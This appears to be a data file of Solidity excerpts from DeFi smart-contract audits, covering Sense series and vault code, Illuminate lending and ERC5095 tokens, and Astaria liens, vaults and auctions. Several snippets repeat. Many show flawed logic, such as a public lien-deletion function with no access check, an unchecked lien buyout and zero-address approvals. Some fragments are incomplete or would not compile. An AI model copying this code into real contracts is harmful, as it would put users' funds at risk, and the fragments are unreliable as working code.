uBal);\n\n    uint256 collected = _collect(msg.sender, adapter, maturity, uBal, uBal, address(0));\n\n    tBal = uBal / cscale;\n    ERC20(Adapter(adapter).target()).safeTransferFrom(adapter, msg.sender, tBal);\n\n    if (!settled) {\n        Adapter(adapter).notify(msg.sender, tBal, false);\n    }\n    unchecked {\n        tBal += collected;\n    }\n    emit Combined(adapter, maturity, tBal, msg.sender);\n}\n```\nfunction _collect(\n    address usr,\n    address adapter,\n    uint256 maturity,\n    uint256 uBal,\n    uint256 uBalTransfer,\n    address to\n) internal returns (uint256 collected) {\n    if (!_exists(adapter, maturity)) {\n        revert Errors.SeriesDoesNotExist();\n    }\n\n    if (!adapterMeta[adapter].enabled &&!_settled(adapter, maturity)) {\n        revert Errors.InvalidAdapter();\n    }\n\n    Series memory _series = series[adapter][maturity];\n    uint256 lscale = lscales[adapter][maturity][usr];\n\n    uint256 tBalNow = uBal / _series.maxscale; // preventive round-up towards the protocol\n    uint256 tBalPrev = uBal / lscale;\n    unchecked {\n        collected = tBalPrev > tBalNow? tBalPrev - tBalNow : 0;\n    }\n\n    ERC20(Adapter(adapter).target()).safeTransferFrom(adapter, usr, collected);\n    Adapter(adapter).notify(usr, collected, false); // Distribute reward tokens\n}\n```"
"```\nuint256 _maturity = utils.getFutureMaturity(targetDuration);\n\nfunction getFutureMaturity(uint256 monthsForward) public view returns (uint256) {\n    (\n        uint256 year,\n        uint256 month,\n        uint256 day\n    ) = DateTime.timestampToDate(\n        DateTime.addMonths(\n            block.timestamp,\n            monthsForward\n        )\n    );\n    return DateTime.timestampFromDateTime(\n        year,\n        month,\n        1,  // top of the month\n        0,\n        0,\n        0\n    );\n}\n```\n```\n(ERC20 _pt, YTLike _yt) = periphery.sponsorSeries(address(adapter), _maturity, true);\n```\n```\nfunction sponsorSeries(\n    address adapter,\n    uint256 maturity,\n    bool withPool\n) external returns (address pt, address yt) {\n    (, address stake, uint256 stakeSize) = Adapter(adapter).getStakeAndTarget();\n\n    ERC20(stake).safeTransferFrom(msg.sender, address(this), stakeSize);\n\n    ERC20(stake).approve(address(divider), stakeSize);\n\n    (pt, yt) = divider.initSeries(adapter, maturity, msg.sender);\n\n    if (verified[adapter]) {\n        poolManager.queueSeries(adapter, maturity, spaceFactory.create(adapter, maturity));\n    } else {\n        if (withPool) {\n            spaceFactory.create(adapter, maturity);\n        }\n    }\n    emit SeriesSponsored(adapter, maturity, msg.sender);\n}\n```\nfunction create(address adapter, uint256 maturity) external returns (address pool) {\n    address pt = divider.pt(adapter, maturity);\n    _require(pt!= address(0), Errors.INVALID_SERIES);\n    _require(pools[adapter][maturity] == address(0), Errors.POOL_ALREADY_EXISTS);\n\n    pool = address(new Space(\n        vault,\n        adapter,\n        maturity,\n        pt,\n        ts,\n        g1,\n        g2,\n        oracleEnabled\n    ));\n\n    pools[adapter][maturity] = pool;\n}\n```"
"```\naddress internal constant DIVIDER = 0x09B10E45A912BcD4E80a8A3119f0cfCcad1e1f12;\n```\n```\n( uint48 prevIssuance,\n    uint256 iscale,\n    uint256 mscale\n) = DividerLike(DIVIDER).series(adapter, prevMaturity);\n```"
"```\nfunction eject(\n    uint256 shares,\n    address receiver,\n    address owner\n) public returns (uint256 assets, uint256 excessBal, bool isExcessPTs) {\n    (excessBal, isExcessPTs) = _exitAndCombine(shares);\n\n    _burn(owner, shares);\n\n    if (isExcessPTs) {\n        pt.transfer(receiver, excessBal);\n    } else {\n        yt.transfer(receiver, excessBal);\n    }\n\n    assets = asset.balanceOf(address(this));\n    asset.transfer(receiver, assets);\n\n    emit Ejected(msg.sender, receiver, owner, assets, shares, \n        isExcessPTs? excessBal : 0, \n        isExcessPTs? 0 : excessBal\n    );\n}\n\nfunction _exitAndCombine(uint256 shares) internal returns (uint256, bool) {\n    uint256 supply = totalSupply;\n\n    uint256 lpBal = shares.mulDivDown(space.balanceOf(address(this)), supply);\n    uint256 totalPTBal = pt.balanceOf(address(this));\n    uint256 ptShare = shares.mulDivDown(totalPTBal, supply);\n\n    uint256 ytBal = shares.mulDivDown(yt.balanceOf(address(this)), supply);\n    ptShare += pt.balanceOf(address(this)) - totalPTBal;\n\n    unchecked {\n        if (ptShare > ytBal) {\n            divider.combine(address(adapter), maturity, ytBal);\n            return (ptShare - ytBal, true);\n        } else {\n            divider.combine(address(adapter), maturity, ptShare);\n            return (ytBal - ptShare, false);\n        }\n    }\n}\n```\n```\nfunction combine(\n    address adapter,\n    uint256 maturity,\n    uint256 uBal\n) external nonReentrant whenNotPaused returns (uint256 tBal) {\n    if (!adapterMeta[adapter].enabled) {\n        revert Errors.InvalidAdapter();\n    }\n    if (!_exists(adapter, maturity)) {\n        revert Errors.SeriesDoesNotExist();\n    }\n\n    uint256 level = adapterMeta[adapter].level;\n    if (level.combineRestricted() && msg.sender!= adapter) {\n        revert Errors.CombineRestricted();\n    }\n\n    // Burn the PT\n    Token(series[adapter][maturity].pt).burn(msg.sender, uBal);\n\n    uint256 collected = _collect(msg.sender, adapter, maturity, uBal, uBal, address(0));\n\n    tBal = uBal / cscale;\n    ERC20(Adapter(adapter).target()).safeTransferFrom(adapter, msg.sender, tBal);\n\n    if (!settled) {\n        Adapter(adapter).notify(msg.sender, tBal, false);\n    }\n    unchecked {\n        tBal += collected;\n    }\n    emit Combined(adapter, maturity, tBal, msg.sender);\n}\n```\nfunction _collect(\n    address usr,\n    address adapter,\n    uint256 maturity,\n    uint256 uBal,\n    uint256 uBalTransfer,\n    address to\n) internal returns (uint256 collected) {\n    if (!_exists(adapter, maturity)) {\n        revert Errors.SeriesDoesNotExist();\n    }\n\n    if (!adapterMeta[adapter].enabled &&!_settled(adapter, maturity)) {\n        revert Errors.InvalidAdapter();\n    }\n\n    Series memory _series = series[adapter][maturity];\n    uint256 lscale = lscales[adapter][maturity][usr];\n\n    uint256 tBalNow = uBal / _series.maxscale; // preventive round-up towards the protocol\n    uint256 tBalPrev = uBal / lscale;\n    unchecked {\n        collected = tBalPrev > tBalNow? tBalPrev - tBalNow : 0;\n    }\n\n    ERC20(Adapter(adapter).target()).safeTransferFrom(adapter, usr, collected);\n    Adapter(adapter).notify(usr, collected, false); // Distribute reward tokens\n}\n```"
"```\nuint256 _maturity = utils.getFutureMaturity(targetDuration);\n\nfunction getFutureMaturity(uint256 monthsForward) public view returns (uint256) {\n    (\n        uint256 year,\n        uint256 month,\n        uint256 day\n    ) = DateTime.timestampToDate(\n        DateTime.addMonths(\n            block.timestamp,\n            monthsForward\n        )\n    );\n    return DateTime.timestampFromDateTime(\n        year,\n        month,\n        1,  // top of the month\n        0,\n        0,\n        0\n    );\n}\n```\n```\n(ERC20 _pt, YTLike _yt) = periphery.sponsorSeries(address(adapter), _maturity, true);\n```\n```\nfunction sponsorSeries(\n    address adapter,\n    uint256 maturity,\n    bool withPool\n) external returns (address pt, address yt) {\n    (, address stake, uint256 stakeSize) = Adapter(adapter).getStakeAndTarget();\n\n    ERC20(stake).safeTransferFrom(msg.sender, address(this), stakeSize);\n\n    ERC20(stake).approve(address(divider), stakeSize);\n\n    (pt, yt) = divider.initSeries(adapter, maturity, msg.sender);\n\n    if (verified[adapter]) {\n        poolManager.queueSeries(adapter, maturity, spaceFactory.create(adapter, maturity));\n    } else {\n        if (withPool) {\n            spaceFactory.create(adapter, maturity);\n        }\n    }\n    emit SeriesSponsored(adapter, maturity, msg.sender);\n}\n```\nfunction create(address adapter, uint256 maturity) external returns (address pool) {\n    address pt = divider.pt(adapter, maturity);\n    _require(pt!= address(0), Errors.INVALID_SERIES);\n    _require(pools[adapter][maturity] == address(0), Errors.POOL_ALREADY_EXISTS);\n\n    pool = address(new Space(\n        vault,\n        adapter,\n        maturity,\n        pt,\n        ts,\n        g1,\n        g2,\n        oracleEnabled\n    ));\n\n    pools[adapter][maturity] = pool;\n}\n```"
"```\nfunction _mint(address receiver, uint256 shares) internal {\n    // Need to transfer before minting or ERC777s could reenter.\n    asset.safeTransferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    emit Deposit(msg.sender, receiver, assets, shares);\n\n    afterDeposit(assets, shares);\n}\n\nfunction previewMint(uint256 shares) public view virtual returns (uint256) {\n    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n    return supply == 0? shares : shares.mulDivUp(totalAssets(), supply);\n}\n```"
"```\nfunction previewWithdraw(uint256 assets) public view virtual returns (uint256) {\n    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n    return supply == 0? assets : assets.mulDivUp(supply, totalAssets());\n}\n```\n```\nfor (uint256 i = 0; i < 20) {\n    if (guess > supply) {\n        guess = supply;\n    }\n\n    int256 answer = previewRedeem(guess.safeCastToUint()).safeCastToInt() - assets.safeCastToInt();\n\n    if (answer >= 0 && answer <= assets.mulWadDown(0.001e18).safeCastToInt() || (prevAnswer == answer)) {\n        break;\n    }\n\n    if (guess == supply && answer < 0) {\n        revert InsufficientLiquidity();\n    }\n\n    int256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\n    prevGuess = guess;\n    prevAnswer = answer;\n    guess = nextGuess;\n\n    unchecked {\n        ++i;\n    }\n}\n\nreturn guess.safeCastToUint() + maxError; // Buffer for pow discrepancies.\n```\n```\nint256 answer = previewRedeem(guess.safeCastToUint()).safeCastToInt() - assets.safeCastToInt();\n```\nint256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\nprevGuess = guess;\nprevAnswer = answer;\nguess = nextGuess;\n```\nreturn guess.safeCastToUint() + maxError;\n```\n```\nint256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\n```"
```\nuint256 totalFunding = (\n    2 * overbalancedValue * \n    fundingRateMultiplier * \n    oracleManager.EPOCH_LENGTH() \n) / (365.25 * 10000);\n```
"```\naddress internal constant DIVIDER = 0x09B10E45A912BcD4E80a8A3119f0cfCcad1e1f12;\n```\n```\n( uint48 prevIssuance,\n    uint256 iscale,\n    uint256 mscale\n) = DividerLike(DIVIDER).series(adapter, prevMaturity);\n```"
"```\n/// @notice Roll into the next Series if there isn't an active series and the cooldown period has elapsed.\nfunction roll() external {\n    if (maturity!= MATURITY_NOT_SET) {\n        revert RollWindowNotOpen();\n    }\n\n    if (lastSettle == 0) {\n        // If this is the first roll, lock some shares in by minting them for the zero address.\n        // This prevents the contract from reaching an empty state during future active periods.\n        deposit(firstDeposit, address(0));\n    } else if (lastSettle + cooldown > block.timestamp) {\n        revert RollWindowNotOpen();\n    }\n\n    lastRoller = msg.sender;\n    adapter.openSponsorWindow();\n}\n```\n```\ndeposit(firstDeposit, address(0))\n```\n```\nfirstDeposit = (0.01e18 - 1) / scalingFactor + 1\n```\n```\nfunction deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {\n    require((shares = previewDeposit(assets))!= 0, ""ZERO_SHARES"");\n\n    asset.safeTransferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    emit Deposit(msg.sender, receiver, assets, shares);\n\n    afterDeposit(assets, shares);\n}\n```\nrequire((shares = previewDeposit(assets))!= 0, ""ZERO_SHARES"");\n\nrequire(asset.safeTransferFrom(msg.sender, address(this), assets));\n```\n```\nfunction previewDeposit(uint256 assets) public view override returns (uint256) {\n    if (maturity == MATURITY_NOT_SET) {\n        return super.previewDeposit(assets);\n    } else {\n        Space _space = space;\n        (uint256 ptReserves, uint256 targetReserves) = _getSpaceReserves();\n\n        uint256 previewedLPBal = (assets - _getTargetForIssuance(\n            ptReserves,\n            targetReserves,\n            assets,\n            adapter.scaleStored()\n        )).mulDivDown(_space.adjustedTotalSupply(), targetReserves);\n\n        uint256 shares = previewedLPBal.mulDivDown(totalSupply, _space.balanceOf(address(this)));\n        return shares;\n    }\n}"
"```\n/// @notice Roll into the next Series if there isn't an active series and the cooldown period has elapsed.\nfunction roll() external {\n    if (maturity!= MATURITY_NOT_SET) {\n        revert RollWindowNotOpen();\n    }\n\n    if (lastSettle == 0) {\n        // If this is the first roll, lock some shares in by minting them for the zero address.\n        // This prevents the contract from reaching an empty state during future active periods.\n        deposit(firstDeposit, address(0));\n    } else if (lastSettle + cooldown > block.timestamp) {\n        revert RollWindowNotOpen();\n    }\n\n    lastRoller = msg.sender;\n    adapter.openSponsorWindow();\n}\n```\n```\ndeposit(firstDeposit, address(0))\n```\n```\nfirstDeposit = (0.01e18 - 1) / scalingFactor + 1\n```\n```\nfunction deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {\n    require((shares = previewDeposit(assets))!= 0, ""ZERO_SHARES"");\n\n    asset.safeTransferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    emit Deposit(msg.sender, receiver, assets, shares);\n\n    afterDeposit(assets, shares);\n}\n```\nrequire((shares = previewDeposit(assets))!= 0, ""ZERO_SHARES"");\n\nrequire(asset.safeTransferFrom(msg.sender, address(this), assets));\n```\n```\nfunction previewDeposit(uint256 assets) public view override returns (uint256) {\n    if (maturity == MATURITY_NOT_SET) {\n        return super.previewDeposit(assets);\n    } else {\n        Space _space = space;\n        (uint256 ptReserves, uint256 targetReserves) = _getSpaceReserves();\n\n        uint256 previewedLPBal = (assets - _getTargetForIssuance(\n            ptReserves,\n            targetReserves,\n            assets,\n            adapter.scaleStored()\n        )).mulDivDown(_space.adjustedTotalSupply(), targetReserves);\n\n        uint256 shares = previewedLPBal.mulDivDown(totalSupply, _space.balanceOf(address(this)));\n        return shares;\n    }\n}"
"```\nfunction previewWithdraw(uint256 assets) public view virtual returns (uint256) {\n    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n    return supply == 0? assets : assets.mulDivUp(supply, totalAssets());\n}\n```\n```\nfor (uint256 i = 0; i < 20) {\n    if (guess > supply) {\n        guess = supply;\n    }\n\n    int256 answer = previewRedeem(guess.safeCastToUint()).safeCastToInt() - assets.safeCastToInt();\n\n    if (answer >= 0 && answer <= assets.mulWadDown(0.001e18).safeCastToInt() || (prevAnswer == answer)) {\n        break;\n    }\n\n    if (guess == supply && answer < 0) {\n        revert InsufficientLiquidity();\n    }\n\n    int256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\n    prevGuess = guess;\n    prevAnswer = answer;\n    guess = nextGuess;\n\n    unchecked {\n        ++i;\n    }\n}\n\nreturn guess.safeCastToUint() + maxError; // Buffer for pow discrepancies.\n```\n```\nint256 answer = previewRedeem(guess.safeCastToUint()).safeCastToInt() - assets.safeCastToInt();\n```\nint256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\nprevGuess = guess;\nprevAnswer = answer;\nguess = nextGuess;\n```\nreturn guess.safeCastToUint() + maxError;\n```\n```\nint256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\n```"
"```\nuint256 received;\n\n{\n    // Get the starting balance of the principal token\n    uint256 starting = token.balanceOf(address(this));\n\n    // Swap those tokens for the principal tokens\n    ISensePeriphery(x).swapUnderlyingForPTs(adapter, s, lent, r);\n\n    // Calculate number of principal tokens received in the swap\n    received = token.balanceOf(address(this)) - starting;\n\n    // Verify that we received the principal tokens\n    if (received < r) {\n        revert Exception(11, 0, 0, address(0), address(0));\n    }\n}\n\n// Mint the Illuminate tokens based on the returned amount\nIERC5095(principalToken(u, m)).authMint(msg.sender, received);\n```"
"```\nfunction mint(\n    uint8 p,\n    address u,\n    uint256 m,\n    uint256 a\n) external unpaused(u, m, p) returns (bool) {\n    address principal = IMarketPlace(marketPlace).token(u, m, p);\n\n    Safe.transferFrom(IERC20(principal), msg.sender, address(this), a);\n\n    IERC5095(principalToken(u, m)).authMint(msg.sender, a);\n\n    emit Mint(p, u, m, a);\n\n    return true;\n}\n```"
"```\nelse if (p == uint8(Principals.Notional)) {\n    ILender(lender).approve(address(0), address(0), address(0), a);\n}\n```\nelse if (p == uint8(Principals.Notional)) {\n    if (a!= address(0)) {\n        Safe.approve(IERC20(address(0)), a, type(uint256).max);\n    }\n```\n```\n        // Swap on the Tempus Router using the provided market and params\n        ITempus(controller).depositAndFix(x, lent, true, r, d);\n\n        // Calculate the amount of Tempus principal tokens received after the deposit\n        uint256 received = IERC20(principal).balanceOf(address(this)) - start;\n\n        if (received < r) {\n            revert Exception(11, received, r, address(0), address(0));\n        }\n```\n```\nfunction depositAndFix(\n    ITempusAMM tempusAMM,\n    uint256 tokenAmount,\n    bool isBackingToken,\n    uint256 minTYSRate,\n    uint256 deadline\n) external payable nonReentrant {\n    uint256 minReturn = swapAmount.mulFV(minTYSRate, targetPool.backingTokenONE());\n    // rest of code\n}"
"```\n- Slashing risk\n\nETH 2.0 validators risk staking penalties, with up to 100% of staked funds at risk if validators fail. To minimize this risk, Lido stakes across multiple professional and reputable node operators with heterogeneous setups, with additional mitigation in the form of insurance that is paid from Lido fees.\n\n- stETH price risk\n\nUsers risk an exchange price of stETH which is lower than inherent value due to withdrawal restrictions on Lido, making arbitrage and risk-free market-making impossible.\n\nThe Lido DAO is driven to mitigate above risks and eliminate them entirely to the extent possible. Despite this, they may still exist, and as such, it is our duty to communicate them.\n```"
"```\nMUST return the maximum amount of shares that could be transferred from `owner` through `redeem` and not cause a revert, \nwhich MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).\n\nMUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST return 0.\n```"
```\nelse if (p == uint8(Principals.Apwine)) {\n    address futureVault = IAPWineToken(a).futureVault();\n    address interestBearingToken = IAPWineFutureVault(futureVault).getIBTAddress();\n    IRedeemer(redeemer).approve(interestBearingToken);\n} else if (p == uint8(Principals.Notional)) {\n```
"```\nfunction mint(address r, uint256 s) external override returns (uint256) {\n    if (block.timestamp > maturity) {\n        revert Exception(\n            21,\n            block.timestamp,\n            maturity,\n            address(0),\n            address(0)\n        );\n    }\n    uint128 assets = Cast.u128(previewMint(s));\n    Safe.transferFrom(\n        IERC20(underlying),\n        msg.sender,\n        address(this),\n        assets\n    );\n    uint128 returned = IMarketPlace(marketplace).sellUnderlying(\n        underlying,\n        maturity,\n        assets,\n        assets - (assets / 100)\n    );\n    _transfer(address(this), r, returned);\n    return returned;\n}\n```\nuint128 returned = \n    IMarketPlace(marketplace).sellUnderlying(\n        underlying,\n        maturity,\n        assets,\n        assets - (assets / 100)\n    );\n```"
"```\nfunction deposit(address r, uint256 a) external override returns (uint256) {\n    if (block.timestamp > maturity) {\n        revert Exception(\n            21,\n            block.timestamp,\n            maturity,\n            address(0),\n            address(0)\n        );\n    }\n    uint128 shares = Cast.u128(previewDeposit(a));\n    Safe.transferFrom(IERC20(underlying), msg.sender, address(this), a);\n    uint128 returned = IMarketPlace(marketplace).sellUnderlying(\n        underlying,\n        maturity,\n        Cast.u128(a),\n        shares - (shares / 100)\n    );\n    _transfer(address(this), r, returned);\n    return returned;\n}\n```\nuint128 returned = \n    IMarketPlace(marketplace).sellUnderlying(\n        underlying,\n        maturity,\n        Cast.u128(a),\n        shares - (shares / 100)\n    );\n```"
```\nbytes4 constant WITHDRAWCLAIM = 0x00ebf5dd;\n```
"```\nfunction validateCommitment(IAstariaRouter.Commitment calldata commitment)\n    public\n    returns (bool valid, IAstariaRouter.LienDetails memory ld)\n{\n    require(\n        commitment.lienRequest.strategy.deadline >= block.timestamp,\n        ""deadline passed""\n    );\n\n    require(\n        strategyValidators[commitment.lienRequest.nlrType]!= address(0),\n        ""invalid strategy type""\n    );\n\n    bytes32 leaf;\n    (leaf, ld) = IStrategyValidator(\n        strategyValidators[commitment.lienRequest.nlrType]\n    ).validateAndParse(\n        commitment.lienRequest,\n        COLLATERAL_TOKEN.ownerOf(\n            commitment.tokenContract.computeId(commitment.tokenId)\n        ),\n        commitment.tokenContract,\n        commitment.tokenId\n    );\n\n    return (\n        MerkleProof.verifyCalldata(\n            commitment.lienRequest.merkle.proof,\n            commitment.lienRequest.merkle.root,\n            leaf\n        ),\n        ld\n    );\n}\n```"
"```\nlien_storage lien = lienData[lienId];\nlien.amount = _getOwed(lien)\n```\n```\nif (isPublicVault) {\n    IPublicVault(lienOwner).beforePayment(lienId, paymentAmount);\n}\n\nif (lien.amount > paymentAmount) {\n    lien.amount -= paymentAmount;\n    lien.last = block.timestamp.safeCastTo32();\n    if (isPublicVault) {\n        IPublicVault(lienOwner).afterPayment(lienId);\n    }\n}\n```\n```\nfunction beforePayment(uint256 lienId, uint256 amount) public onlyLienToken {\n    _handleStrategistInterestReward(lienId, amount);\n    uint256 lienSlope = LIEN_TOKEN().calculateSlope(lienId);\n    if (lienSlope > slope) {\n        slope = 0;\n    } else {\n        slope -= lienSlope;\n    }\n    last = block.timestamp;\n}\n```\n```\nfunction calculateSlope(uint256 lienId) public view returns (uint256) {\n    Lien memory lien = lienData[lienId];\n    uint256 end = (lien.start + lien.duration);\n    uint256 owedAtEnd = _getOwed(lien, end);\n    return (owedAtEnd - lien.amount).mulDivDown(1, end - lien.last);\n}\n```\nfunction _getOwed(Lien memory lien, uint256 timestamp)\n    internal\n    view\n    returns (uint256) {\n    return lien.amount + _getInterest(lien, timestamp);\n}\n```\n```\nfunction _getInterest(Lien memory lien, uint256 timestamp)\n    internal\n    view\n    returns (uint256) {\n    if (!lien.active) {\n        return uint256(0);\n    }\n    uint256 delta_t;\n    if (block.timestamp >= lien.start + lien.duration) {\n        delta_t = uint256(lien.start + lien.duration - lien.last);\n    } else {\n        delta_t = uint256(timestamp.safeCastTo32() - lien.last);\n    }\n    return delta_t.mulDivDown(lien.rate, 1).mulDivDown(lien.amount, INTEREST_DENOMINATOR);\n}\n```"
"```\nfunction buyoutLien(ILienToken.LienActionBuyout calldata params) external {\n    _transfer(ownerOf(lienId), address(params.receiver), lienId);\n}\n```"
"```\nfunction _deleteLienPosition(uint256 collateralId, uint256 position) public {\n    uint256[] storage stack = liens[collateralId];\n    require(position < stack.length, ""index out of bounds"");\n\n    emit RemoveLien(\n        stack[position],\n        lienData[stack[position]].collateralId,\n        lienData[stack[position]].position\n    );\n\n    for (uint256 i = position; i < stack.length - 1; i++) {\n        stack[i] = stack[i + 1];\n    }\n    stack.pop();\n}\n```"
"```\n/**\n * @notice Hook to update the slope and yIntercept of the PublicVault on payment.\n * The rate for the LienToken is subtracted from the total slope of the PublicVault, and recalculated in afterPayment().\n * @param lienId The ID of the lien.\n * @param amount The amount paid off to deduct from the yIntercept of the PublicVault.\n```"
"```\nuint256[] memory liens = LIEN_TOKEN.getLiens(tokenId);\nuint256 totalLienAmount = 0;\n\nif (liens.length > 0) {\n    for (uint256 i = 0; i < liens.length; ++i) {\n        uint256 payment;\n        uint256 lienId = liens[i];\n\n        ILienToken.Lien memory lien = LIEN_TOKEN.getLien(lienId);\n\n        if (transferAmount >= lien.amount) {\n            payment = lien.amount;\n            transferAmount -= payment;\n        } else {\n            payment = transferAmount;\n            transferAmount = 0;\n        }\n        if (payment > 0) {\n            LIEN_TOKEN.makePayment(tokenId, payment, lien.position, payer);\n        }\n    }\n} else {\n    TRANSFER_PROXY.tokenTransferFrom(\n        weth,\n        payer,\n        COLLATERAL_TOKEN.ownerOf(tokenId),\n        transferAmount\n    );\n}\n```\n```\nuint256 vaultPayment = (amount - currentBid);\n\nif (firstBidTime == 0) {\n    auctions[tokenId].firstBidTime = block.timestamp.safeCastTo64();\n} else if (lastBidder!= address(0)) {\n    uint256 lastBidderRefund = amount - vaultPayment;\n    _handleOutGoingPayment(lastBidder, lastBidderRefund);\n}\n\n_handleIncomingPayment(tokenId, vaultPayment, address(msg.sender));\n\nauctions[tokenId].currentBid = amount;\nauctions[tokenId].bidder = address(msg.sender);\n```"
"```\nfunction redeemFutureEpoch(\n    uint256 shares,\n    address receiver,\n    address owner,\n    uint64 epoch\n) public virtual returns (uint256 assets) {\n    require(epoch >= currentEpoch, ""Exit epoch too low"");\n\n    require(msg.sender == owner, ""Only the owner can redeem"");\n\n    ERC20(address(this)).safeTransferFrom(owner, address(this), shares);\n\n    _deployWithdrawProxyIfNotDeployed(epoch);\n\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n    WithdrawProxy(withdrawProxies[epoch]).mint(receiver, shares);\n}\n```\nif (withdrawProxies[currentEpoch]!= address(0)) {\n    uint256 proxySupply = WithdrawProxy(withdrawProxies[currentEpoch]).totalSupply();\n\n    liquidationWithdrawRatio = proxySupply.mulDivDown(1e18, totalSupply());\n\n    if (liquidationAccountants[currentEpoch]!= address(0)) {\n        LiquidationAccountant(liquidationAccountants[currentEpoch]).setWithdrawRatio(liquidationWithdrawRatio);\n    }\n\n    uint256 withdrawAssets = convertToAssets(proxySupply);\n\n    uint256 withdrawLiquidations = liquidationsExpectedAtBoundary[currentEpoch].mulDivDown(liquidationWithdrawRatio, 1e18);\n    withdrawReserve = withdrawAssets - withdrawLiquidations;\n\n    _burn(address(this), proxySupply);\n\n    _decreaseYIntercept(withdrawAssets);\n}"
"```\nVaultImplementation(vaultAddr).init(\n    VaultImplementation.InitParams(\n        delegate\n    )\n);\n```\nif (params.delegate!= address(0)) {\n    delegate = params.delegate;\n}\n```\n```\naddress recovered = ecrecover(\n    keccak256(\n        encodeStrategyData(\n            params.lienRequest.strategy,\n            params.lienRequest.merkle.root\n        )\n    ),\n    params.lienRequest.v,\n    params.lienRequest.r,\n    params.lienRequest.s\n);\n```\nrequire(\n  recovered == params.lienRequest.strategy.strategist,\n  ""strategist must match signature""\n);\n\nrequire(\n  recovered == owner() || recovered == delegate,\n  ""invalid strategist""\n)\n```"
```\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow())\n```\n```\nif (firstBidTime + duration - block.timestamp < timeBuffer) {\n    uint64 newDuration = uint256(\n        duration + (block.timestamp + timeBuffer - firstBidTime)\n    ).safeCastTo64();\n    if (newDuration <= auctions[tokenId].maxDuration) {\n        auctions[tokenId].duration = newDuration;\n    } else {\n        auctions[tokenId].duration = \n            auctions[tokenId].maxDuration - firstBidTime;\n    }\n    extended = true;\n}\n```
"```\nfunction _handleStrategistInterestReward(uint256 lienId, uint256 amount)\n    internal\n    virtual\n    override\n{\n    if (VAULT_FEE()!= uint256(0)) {\n        uint256 interestOwing = LIEN_TOKEN().getInterest(lienId);\n        uint256 x = (amount > interestOwing)? interestOwing : amount;\n        uint256 fee = x.mulDivDown(VAULT_FEE(), 1000);\n        strategistUnclaimedShares += convertToShares(fee);\n    }\n}\n```"
"```\nPublicVault(VAULT()).decreaseYIntercept(\n    (expected - ERC20(underlying()).balanceOf(address(this))).mulDivDown(\n        1e18 - withdrawRatio,\n        1e18\n    )\n);\n```"
"```\nLiquidationAccountant(accountant).handleNewLiquidation(\n  lien.amount,\n  COLLATERAL_TOKEN.auctionWindow() + 1 * days\n)\n```\nrequire(\n    block.timestamp > finalAuctionEnd || finalAuctionEnd == uint256(0),\n    ""final auction has not ended""\n);"
"```\nuint256 initiatorPayment = transferAmount.mulDivDown(\n    auction.initiatorFee,\n    100\n);\n```\nif (transferAmount >= lien.amount):\n    payment = lien.amount\n    transferAmount -= payment\nelse:\n    payment = transferAmount\n    transferAmount = 0\n\nif payment > 0:\n    LIEN_TOKEN.makePayment(tokenId, payment, lien.position, payer)\n```"
"```\nif (!ASTARIA_ROUTER.isValidRefinance(lienData[lienId], ld)) {\n    revert InvalidRefinance();\n}\n```\n```\nreturn (\n    newLien.rate >= minNewRate &&\n    (block.timestamp + newLien.duration - lien.start - lien.duration) >= minDurationIncrease\n);"
"```\nif (!ASTARIA_ROUTER.isValidRefinance(lienData[lienId], ld)) {\n    revert InvalidRefinance();\n}\n```\n```\nuint256 minNewRate = uint256(lien.rate) - minInterestBPS;\nreturn (newLien.rate >= minNewRate)\n```"
"```\nfunction testBasicPublicVaultLoan() public {\n    IAstariaRouter.LienDetails memory standardLien2 = \n    IAstariaRouter.LienDetails({\n        maxAmount: 50 ether,\n        rate: (uint256(1e16) * 150) / (365 days),\n        duration: 50 days,\n        maxPotentialDebt: 50 ether\n    });    \n\n    _commitToLien({\n        vault: publicVault,\n        strategist: strategistOne,\n        strategistPK: strategistOnePK,\n        tokenContract: tokenContract,\n        tokenId: tokenId,\n        lienDetails: standardLien2,\n        amount: 10 ether,\n        isFirstLien: true\n    });\n}\n```"
"```\nfunction _makePayment(uint256 collateralId, uint256 totalCapitalAvailable)\n  internal\n{\n  uint256[] memory openLiens = liens[collateralId];\n  uint256 paymentAmount = totalCapitalAvailable;\n\n  for (uint256 i = 0; i < openLiens.length; ++i) {\n    uint256 capitalSpent = _payment(\n      collateralId,\n      uint8(i),\n      paymentAmount,\n      address(msg.sender)\n    );\n    paymentAmount -= capitalSpent;\n  }\n}\n```\n```\nfunction _deleteLienPosition(uint256 collateralId, uint256 position) public {\n    uint256[] storage stack = liens[collateralId];\n    require(position < stack.length, ""index out of bounds"");\n\n    emit RemoveLien(\n        stack[position],\n        lienData[stack[position]].collateralId,\n        lienData[stack[position]].position\n    );\n\n    for (uint256 i = position; i < stack.length - 1; i++) {\n        stack[i] = stack[i + 1];\n    }\n    stack.pop();\n}\n```"
